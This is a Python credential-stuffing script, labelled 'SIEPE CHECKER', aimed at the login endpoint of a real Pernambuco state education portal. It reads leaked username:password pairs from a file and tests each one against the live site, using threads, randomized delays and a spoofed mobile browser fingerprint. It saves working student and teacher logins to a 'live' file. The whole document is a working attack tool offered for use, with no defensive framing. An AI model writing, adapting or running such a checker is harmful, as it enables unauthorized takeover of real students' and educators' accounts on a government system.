import requests
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
import threading

init(autoreset=True)

url = "https://www.siepe.educacao.pe.gov.br/GerenciadorAcessoWeb/segurancaAction.do?actionType=ajaxLogin"
headers = {
    "accept": "*/*",
    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest",
    "referer": "https://www.siepe.educacao.pe.gov.br/"
}

LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
ERROR_FILE = 'error.txt'
MAX_THREADS = 5
DELAY = (1, 3)

stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time(),
    'running': True
}

def update_panel():
    while stats['running']:
        elapsed = time.time() - stats['start_time']
        print("\033[H\033[J", end='')
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.YELLOW + "      SIEPE CHECKER")
        print(Fore.CYAN + "══════════════════════════════════")
        print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
        print(Fore.RED + f" ❌ DIE: {stats['die']}")
        print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
        print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
        print(Fore.CYAN + "══════════════════════════════════", end='\r')
        time.sleep(0.1)

def read_credentials():
    credentials = []
    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as file:
            for line in file:
                if ':' in line:
                    login, password = line.strip().split(':', 1)
                    credentials.append((login.strip(), password.strip()))
        stats['total'] = len(credentials)
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
    return credentials

def random_delay():
    time.sleep(random.uniform(*DELAY))

def check_account(account):
    username, password = account
    try:
        payload = {
            "redirecionamento": "",
            "idFuncionalidade": "",
            "login": username,
            "senha": password,
            "actionType": "",
            "dojo.preventCache": str(int(time.time() * 1000))
        }
        
        response = requests.post(url, headers=headers, data=payload, timeout=15)
        
        if "/Site/Aluno/" in response.text or "Educador" in response.text:
            stats['live'] += 1
            tipo = "Aluno" if "/Site/Aluno/" in response.text else "Educador/Professor"
            save_result(LIVE_FILE, username, password, tipo)
            return f"{Fore.GREEN}✅ LIVE - {username}:{password} | {tipo}"
        elif '{"mensagem":"Login ou senha inválidos."}' in response.text:
            stats['die'] += 1
            save_result(DIE_FILE, username, password)
            return f"{Fore.RED}❌ DIE - {username}:{password}"
        elif '{"mensagem":"Seu acesso está bloqueado."}' in response.text:
            stats['die'] += 1
            save_result(DIE_FILE, username, password, "BLOQUEADO")
            return f"{Fore.RED}❌ DIE - {username}:{password} | BLOQUEADO"
        else:
            raise Exception("Resposta inesperada")
            
    except Exception as e:
        stats['error'] += 1
        save_result(ERROR_FILE, username, password, str(e))
        return f"{Fore.YELLOW}⚠ ERROR - {username}:{password} | {str(e)[:50]}"

def save_result(filename, username, password, extra_info=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{username}:{password}"
            if extra_info:
                line += f" | {extra_info}"
            f.write(line + "\n")
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar resultado: {e}")

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    for f in [LIVE_FILE, DIE_FILE, ERROR_FILE]:
        if os.path.exists(f):
            os.remove(f)

    credentials = read_credentials()
    if not credentials:
        print(Fore.RED + "Nenhuma credencial válida encontrada!")
        return

    panel_thread = threading.Thread(target=update_panel)
    panel_thread.daemon = True
    panel_thread.start()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for account in credentials:
            futures.append(executor.submit(check_account, account))
            random_delay()

        for future in as_completed(futures):
            print(future.result())

    stats['running'] = False
    panel_thread.join()

    print(Fore.CYAN + "\n✅ Verificação concluída!")
    print(Fore.GREEN + f"Contas válidas: {LIVE_FILE}")
    print(Fore.RED + f"Contas inválidas: {DIE_FILE}")
    print(Fore.YELLOW + f"Erros: {ERROR_FILE}")

if __name__ == "__main__":
    main()